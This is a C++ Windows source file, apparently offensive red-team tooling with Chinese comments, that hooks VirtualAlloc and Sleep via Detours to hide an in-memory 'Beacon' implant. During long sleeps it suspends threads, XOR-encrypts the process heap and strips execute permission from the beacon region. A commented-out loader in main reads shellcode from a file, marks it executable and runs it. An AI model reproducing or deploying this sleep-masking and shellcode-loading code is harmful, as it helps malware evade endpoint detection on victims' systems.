#include <iostream>
#include<Windows.h>
#include <tlhelp32.h>
#include "detours.h"
#include "detver.h"
#pragma comment(lib,"detours_x64.lib")


LPVOID Beacon_address;
SIZE_T Beacon_data_len;
DWORD Beacon_Memory_address_flOldProtect;

const char key[2] = "A";
size_t keySize = sizeof(key);

LPVOID shellcode_addr;



// Pass 0 as the targetProcessId to suspend threads in the current process
void DoSuspendThreads(DWORD targetProcessId, DWORD targetThreadId)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					// Suspend all threads EXCEPT the one we want to keep running
					if (te.th32ThreadID != targetThreadId && te.th32OwnerProcessID == targetProcessId)
					{
						HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
						if (thread != NULL)
						{
							SuspendThread(thread);
							CloseHandle(thread);
						}
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}

void DoResumeThreads(DWORD targetProcessId, DWORD targetThreadId)
{
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h != INVALID_HANDLE_VALUE)
	{
		THREADENTRY32 te;
		te.dwSize = sizeof(te);
		if (Thread32First(h, &te))
		{
			do
			{
				if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID))
				{
					// Suspend all threads EXCEPT the one we want to keep running
					if (te.th32ThreadID != targetThreadId && te.th32OwnerProcessID == targetProcessId)
					{
						HANDLE thread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
						if (thread != NULL)
						{
							ResumeThread(thread);
							CloseHandle(thread);
						}
					}
				}
				te.dwSize = sizeof(te);
			} while (Thread32Next(h, &te));
		}
		CloseHandle(h);
	}
}



void xor_bidirectional_encode(const char* key, const size_t keyLength, char* buffer, const size_t length) {
	for (size_t i = 0; i < length; ++i) {
		buffer[i] ^= key[i % keyLength];
	}
}

PROCESS_HEAP_ENTRY entry;
void HeapEncryptDecrypt() {
	SecureZeroMemory(&entry, sizeof(entry));
	while (HeapWalk(GetProcessHeap(), &entry)) {
		if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
			xor_bidirectional_encode(key, keySize, (char*)(entry.lpData), entry.cbData);
		}
	}
}


static LPVOID(WINAPI* OldVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAlloc;
LPVOID WINAPI NewVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
	Beacon_data_len = dwSize;
	Beacon_address = OldVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
	printf("分配大小:%d", Beacon_data_len);
	printf("分配地址:%llx \n", Beacon_address);
	return Beacon_address;
}

static VOID(WINAPI* OldSleep)(DWORD dwMilliseconds) = Sleep;

void WINAPI NewSleep(DWORD dwMilliseconds)
{
	/*
	if (Vir_FLAG)
	{
		VirtualFree(shellcode_addr, 0, MEM_RELEASE);
		Vir_FLAG = false;
	}
	printf("sleep时间:%d\n", dwMilliseconds);
	SetEvent(hEvent);
	OldSleep(dwMilliseconds);
	*/
	printf("sleep时间:%d\n", dwMilliseconds);
	if (dwMilliseconds > 1000) {
		//挂起线程
		DoSuspendThreads(GetCurrentProcessId(), GetCurrentThreadId());
		//加密堆数据
		HeapEncryptDecrypt();
		//设置内存访问权限
		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_READWRITE, &Beacon_Memory_address_flOldProtect);
		OldSleep(dwMilliseconds);
		VirtualProtect(Beacon_address, Beacon_data_len, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
		HeapEncryptDecrypt();
		//恢复线程
		DoResumeThreads(GetCurrentProcessId(), GetCurrentThreadId());
	}
	else {
		OldSleep(dwMilliseconds);
	}

}

void Hook()
{
	DetourRestoreAfterWith(); //避免重复HOOK
	DetourTransactionBegin(); // 开始HOOK
	DetourUpdateThread(GetCurrentThread());
	DetourAttach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourAttach((PVOID*)&OldSleep, NewSleep);
	DetourTransactionCommit(); //  提交HOOK
}

void UnHook()
{
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach((PVOID*)&OldVirtualAlloc, NewVirtualAlloc);
	DetourTransactionCommit();
}

size_t GetSize(char* szFilePath)
{
	size_t size;
	FILE* f = fopen(szFilePath, "rb");
	fseek(f, 0, SEEK_END);
	size = ftell(f);
	rewind(f);
	fclose(f);
	return size;
}

unsigned char* ReadBinaryFile(char* szFilePath, size_t* size)
{
	unsigned char* p = NULL;
	FILE* f = NULL;
	size_t res = 0;
	*size = GetSize(szFilePath);
	if (*size == 0) return NULL;
	f = fopen(szFilePath, "rb");
	if (f == NULL)
	{
		printf("Binary file does not exists!\n");
		return 0;
	}
	p = new unsigned char[*size];
	// Read file
	rewind(f);
	res = fread(p, sizeof(unsigned char), *size, f);
	fclose(f);
	if (res == 0)
	{
		delete[] p;
		return NULL;
	}
	return p;
}

int main()
{

	Hook();


	while (1) {
	};


	/*
	unsigned char* BinData = NULL;
	size_t size = 0;


	char szf[] = "bb.txt";
	char* szFilePath = szf;
	BinData = ReadBinaryFile(szFilePath, &size);
	shellcode_addr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
	memcpy(shellcode_addr, BinData, size);
	VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READWRITE, &Beacon_Memory_address_flOldProtect);
	(*(int(*)()) shellcode_addr)();

	UnHook();

	return 0;
	*/


}